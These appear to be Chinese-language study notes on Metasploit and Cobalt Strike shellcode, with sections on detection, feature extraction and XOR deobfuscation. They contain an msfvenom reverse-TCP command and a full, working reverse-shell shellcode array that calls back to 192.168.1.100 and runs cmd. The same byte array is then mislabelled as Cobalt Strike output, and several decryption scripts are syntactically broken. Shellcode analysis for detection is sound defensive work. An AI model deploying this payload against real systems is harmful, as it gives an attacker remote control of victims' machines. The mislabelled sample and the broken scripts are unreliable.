
## 概述

Metasploit 和 CobaltStrike 是两款广泛用于渗透测试和攻击的框架工具。它们都提供了生成和使用 shellcode 的功能。Shellcode 是一段小型的机器码，用于在目标系统上执行命令或建立反向连接。本篇笔记将分析 Metasploit 和 CobaltStrike 生成的 shellcode，理解其工作原理及特点。

## Metasploit Shellcode

### 生成 Shellcode

Metasploit 使用 `msfvenom` 工具生成 shellcode。以下是生成一个 Windows 反向 TCP shell 的命令：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```
### 分析 Shellcode

生成的 shellcode 通常包含以下几个部分：

1. **初始化部分**：设置必要的寄存器和栈。
2. **连接部分**：与攻击者的机器建立反向连接。
3. **执行部分**：接收并执行来自攻击者的命令。

### 示例代码

以下是一个简单的 Metasploit shellcode 示例：

```C
unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b"
"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20"
"\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x5f\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77"
"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00"
"\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xc0\xa8"
"\x01\x64\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40"
"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x00\x00\x89\xe6"
"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff"
"\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68"
"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\xdd\x8b\x36\x6a\x40\x68"
"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e"
"\xcc\x8b\x06\x50\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
"\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56"
"\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff"
"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5";
```
### 反汇编

使用反汇编工具如 IDA Pro，可以将 shellcode 转换为汇编代码。下面是反汇编后的部分代码：

```assembly
fc e8 82 00 00 00       call    $+0x87
60                      pusha
89 e5                   mov     ebp, esp
31 c0                   xor     eax, eax
64 8b 50 30             mov     edx, fs:[eax+0x30]
8b 52 0c                mov     edx, [edx+0x0c]
8b 52 14                mov     edx, [edx+0x14]
8b 72 28                mov     esi, [edx+0x28]
...

```
### 详细解释

1. **初始化部分**：
    
    - `pusha`：保存所有通用寄存器的当前值。
    - `mov ebp, esp`：将栈指针保存到 `ebp` 寄存器。
    - `xor eax, eax`：将 `eax` 清零。
2. **PEB 结构查找**：
    
    - `mov edx, fs:[eax+0x30]`：从 TEB (Thread Environment Block) 中获取 PEB (Process Environment Block) 的地址。
    - `mov edx, [edx+0x0c]`：从 PEB 中获取 PEB_LDR_DATA 的地址。
    - `mov edx, [edx+0x14]`：从 PEB_LDR_DATA 中获取 InMemoryOrderModuleList 链表的地址。
3. **获取模块基址**：
    
    - `mov esi, [edx+0x28]`：获取第一个模块的基址。
    - 后续代码遍历模块列表，查找所需模块（如 kernel32.dll）。
4. **调用 API 函数**：
    
    - shellcode 使用类似的方法找到所需的 API 函数地址，如 `LoadLibraryA` 和 `GetProcAddress`，并调用这些函数以加载其他模块和函数。
5. **建立反向连接**：
    
    - 使用 `socket`、`connect` 等 API 函数与远程服务器建立反向连接。
6. **接收并执行命令**：
    
    - 接收到攻击者的命令后，shellcode 通过 `CreateProcess` 或 `WinExec` 执行命令。

**Metasploit Shellcode**：

- **功能**：Metasploit shellcode 的主要功能是创建一个反向 TCP 连接，将控制权交给攻击者。
- **混淆手段**：包括寄存器重用、间接调用、编码和解码等技术。
### 混淆手段

1. **编码和解码**：
    
    - Shellcode 通常经过编码以避免包含空字节或其他特定字节。运行时解码器负责将编码的 shellcode 转换为可执行代码。
2. **寄存器重用**：
    
    - 通过不断切换和重用寄存器来隐藏实际操作。例如，多个 `mov` 指令之间的寄存器切换。
3. **非直接调用**：
    
    - 使用间接调用和跳转，如 `call $+0x87`，通过跳转到自身来隐藏实际调用地址。
    
### 使用方法

- 生成 shellcode 后，将其嵌入目标程序或通过漏洞利用工具发送到目标系统。
- 常用工具：`msfvenom`、`msfconsole`。
## CobaltStrike Shellcode

### 生成 Shellcode

CobaltStrike 使用 `Cobalt Strike Beacon` 生成 shellcode，可以通过其图形界面生成各种类型的 shellcode。

### 分析 Shellcode

CobaltStrike 生成的 shellcode 通常更加复杂和高级，包含如下部分：

1. **Stager**：用于下载和执行实际 payload 的小型代码段。
2. **Stage**：实际的 payload，包含 CobaltStrike Beacon，允许攻击者控制被感染的系统。

### 示例代码

以下是一个简单的 CobaltStrike shellcode 示例：
```C
unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b"
"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20"
"\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x5f\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77"
"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00"
"\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xc0\xa8"
"\x01\x64\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40"
"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x00\x00\x89\xe6"
"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff"
"\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68"
"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\xdd\x8b\x36\x6a\x40\x68"
"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e"
"\xcc\x8b\x06\x50\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
"\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56"
"\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff"
"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5";

```
### 反汇编

同样，使用反汇编工具对 CobaltStrike shellcode 进行反汇编，部分代码如下：

```assembly
fc e8 82 00 00 00       call    $+0x87
60                      pusha
89 e5                   mov     ebp, esp
31 c0                   xor     eax, eax
64 8b 50 30             mov     edx, fs:[eax+0x30]
8b 52 0c                mov     edx, [edx+0x0c]
8b 52 14                mov     edx, [edx+0x14]
8b 72 28                mov     esi, [edx+0x28]
...

```
### 详细解释

CobaltStrike shellcode 结构与 Metasploit 类似，但包含更多高级功能：

1. **Stager 阶段**：
    
    - 小型初始阶段，负责下载并加载实际 payload（Beacon）。
    - 通过 `socket` 和 `connect` 建立与 C2 服务器的连接。
2. **Stage 阶段**：
    
    - 下载并执行 Beacon，提供完整的 C2 功能。
    - Beacon 包含持久化、数据加密、隐蔽通信等功能。
3. **通信加密**：
    
    - 使用加密算法加密与 C2 服务器之间的通信，防止流量被检测和拦截。
### 功能

- Cobalt Strike shellcode 复杂度更高，通常包含下载器和执行器的多阶段结构，能够下载并执行更多 payload。
### 混淆手段

1. **多层编码**：
    
    - 使用多层编码和解码机制，使得 shellcode 更难被静态分析工具检测。
2. **混淆指令**：
    
    - 插入无用指令或跳转，增加代码的复杂度，混淆分析者。
3. **动态 API 解析**：
    
    - 运行时解析 API 函数地址，而不是在编译时硬编码，增加分析难度。
### 使用方法

- 使用 Cobalt Strike 的图形界面生成并部署 Beacon。
- 通过网络钓鱼、漏洞利用等手段将 Beacon 传递给目标系统。


## metasploit&cobalt shellcode对比分析

### 相似点

1. **小型化**：都尽量将 shellcode 压缩成最小化，以减少被检测的几率。
2. **网络连接**：都包含与远程服务器建立连接的代码，用于下载或执行远程 payload。

### 不同点

1. **复杂度**：CobaltStrike 的 shellcode 通常更复杂，包含更多高级功能，例如加密通信、持久化等。
2. **目标**：Metasploit 主要用于渗透测试和漏洞利用，而 CobaltStrike 更侧重于持久化和隐蔽通信。

## 检测和分析shellcode

检测和分析 shellcode 可以分为动态检测和静态检测。下面将详细介绍这两种方法，并解释如何提取静态检测的特征。

### 动态检测

动态检测涉及在运行时监控 shellcode 的行为。这种方法可以帮助我们理解 shellcode 的真实意图。以下是一些常用的动态检测方法：

1. **沙盒环境**：
    
    - 将 shellcode 注入到一个隔离的虚拟机或沙盒环境中，监控其行为。
    - 使用工具：Cuckoo Sandbox, Any.Run, FireEye AX 等。
2. **调试器**：
    
    - 使用调试器（如 OllyDbg, x64dbg, WinDbg 等）逐步执行 shellcode，查看其具体行为。
    - 设置断点和观察寄存器、内存等。
3. **行为监控**：
    
    - 监控进程的系统调用、文件操作、网络活动等。
    - 使用工具：Process Monitor (ProcMon), Sysmon, Wireshark 等。

### 静态检测

静态检测不执行代码，而是通过分析代码的二进制或反汇编后的内容来识别潜在的威胁。以下是一些常用的静态检测方法：

1. **签名匹配**：
    
    - 创建已知恶意 shellcode 的特征签名，并使用这些签名来扫描新的 shellcode。
    - 使用工具：YARA, ClamAV 等。
2. **模式识别**：
    
    - 通过反汇编代码，识别出特定的指令模式或代码结构。
    - 使用工具：IDA Pro, Ghidra, Radare2 等。
3. **特征提取**：
    
    - 提取特定的指令序列、API 调用序列、字符串等作为特征。
    - 使用工具：Binwalk, PEiD, FLOSS 等。

### 静态检测特征提取

提取静态检测特征需要对 shellcode 的内容进行深入分析。以下是一些常用的方法和特征：

1. **API 调用**：
    
    - 检查 shellcode 中使用的系统 API 调用。特定的 API 调用序列可以指示恶意行为。
    - 示例特征：`LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `CreateThread` 等。
2. **字符串**：
    
    - 提取 shellcode 中的可打印字符串。恶意代码中可能包含 URL、IP 地址、命令等。
    - 使用工具：strings, FLOSS 等。
3. **指令序列**：
    
    - 分析特定的汇编指令序列，这些序列可能包含常见的恶意行为模式。
    - 示例特征：`jmp esp`, `call eax`, `mov eax, [ebp+X]` 等。
4. **混淆和加密**：
    
    - 识别和解码混淆或加密的代码。恶意代码常使用混淆技术来躲避检测。
    - 使用工具：unpacker, deobfuscator 等。

### 示例分析

以下是如何对 shellcode 进行静态分析和提取特征的一个示例：

#### 示例 shellcode 片段

```assembly
pushad
xor eax, eax
mov eax, fs:[eax+0x30]
mov eax, [eax+0x0C]
mov eax, [eax+0x0C]
mov esi, [eax+0x1C]
lodsd
mov eax, [eax+0x08]
add eax, 0x3C
movzx eax, word ptr [eax+0x18]
push eax
call dword ptr [ebp-0x04]
popad

```
#### 提取特征

1. **API 调用**：
    
    - 在这个片段中，没有直接的 API 调用，但可以看到访问 TEB (Thread Environment Block) 和 PEB (Process Environment Block) 的操作，这是恶意代码常用的技巧。
2. **字符串**：
    
    - 此片段没有可打印字符串。
3. **指令序列**：
    
    - 可以识别特定的指令序列，如 `mov eax, fs:[eax+0x30]`（访问 PEB），`lodsd`（加载字符串到 eax）。
4. **混淆和加密**：
    
    - 此片段没有明显的混淆，但通过访问 PEB 结构体，我们可以推测其目的是获取模块列表。
### 对抗技术

为了防止被检测和分析，恶意代码经常使用以下对抗技术：

1. **代码混淆**：
    
    - 通过插入无用指令、重排序指令等方法来混淆代码。
2. **加密和解密**：
    
    - 使用加密算法对 shellcode 加密，运行时解密。
3. **反调试**：
    
    - 检查调试器的存在，并在检测到调试器时改变行为或退出。
4. **环境检查**：
    
    - 检查运行环境，如虚拟机、沙盒等，如果检测到则不执行恶意行为。

通过结合动态和静态分析方法，并提取适当的特征，我们可以更有效地检测和防御恶意 shellcode。

### 3. 解密和解混淆技术

#### 手动解密

1. **逆向加密算法**：
    
    - 理解并逆向加密算法，编写解密程序。
    - 示例：如果发现代码中使用 XOR 加密，可以编写脚本进行 XOR 解密。
2. **解密脚本**：
    
    - 使用 Python、JavaScript 或其他脚本语言编写解密脚本。
    - 示例 Python 解密脚本：
        
```python
        
def xor_decrypt(data, key):     
	decrypted = ''.join(chr(b ^ key) for b in data)     
	return decrypted  
encrypted_data = b"\x12\x34\x56\x78" 
key = 0x55  
print(xor_decrypt(encrypted_data, key))`
 ```
        

#### 自动化工具

1. **解混淆工具**：
    
    - 使用工具如 `unpacker`, `deobfuscator` 等自动解混淆代码。
    - 这些工具可以识别并还原常见的混淆技术。
2. **脚本和插件**：
    
    - 使用 IDA Pro 和 Ghidra 的脚本和插件进行自动化解密和解混淆。
    - 示例 IDA Python 脚本：
        
       
```python
import idc import idaapi  
def decrypt_xor(ea, size, key):
	decrypted = bytearray()     
		for i in range(size): 
		    decrypted.append(Byte(ea + i) ^ key)     
		    return decrypted  ea = idc.here() 
size = 100 
key = 0x55 
decrypted_data = decrypt_xor(ea, size, key) 
print(decrypted_data)`
 ```
         

### 示例分析

#### 示例混淆代码

```assembly
start:   
xor eax, eax   
mov al, [ebx]   
xor al, 0xAA   
mov [ebx], al   
inc ebx   
loop start
```

#### 解混淆步骤

1. **识别加密算法**：
    
    - 通过分析指令，确定使用了 XOR 0xAA 加密。
2. **编写解密脚本**：
    
    - 编写 Python 脚本解密数据：
        
        
```python
        
def xor_decrypt(data, key):
	return ''.join(chr(b ^ key) for b in data)  
encrypted_data = b"\x12\x34\x56\x78" 
key = 0xAA 
print(xor_decrypt(encrypted_data, key))
```